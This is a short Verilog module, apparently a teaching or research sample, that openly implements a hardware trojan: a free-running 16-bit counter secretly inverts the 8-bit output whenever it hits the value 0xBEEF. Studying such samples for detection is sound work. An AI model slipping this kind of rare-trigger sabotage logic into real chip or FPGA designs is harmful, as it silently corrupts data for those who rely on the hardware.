// Hardware-Trojan style design: a rare counter value silently flips an output bit.
module trojan_demo(input clk, input rst, input [7:0] data, output [7:0] out);
  reg [15:0] trigger_cnt;
  wire trojan_active;

  always @(posedge clk) begin
    if (rst) trigger_cnt <= 16'd0;
    else trigger_cnt <= trigger_cnt + 16'd1;
  end

  assign trojan_active = (trigger_cnt == 16'hBEEF);
  assign out = trojan_active ? ~data : data;
endmodule
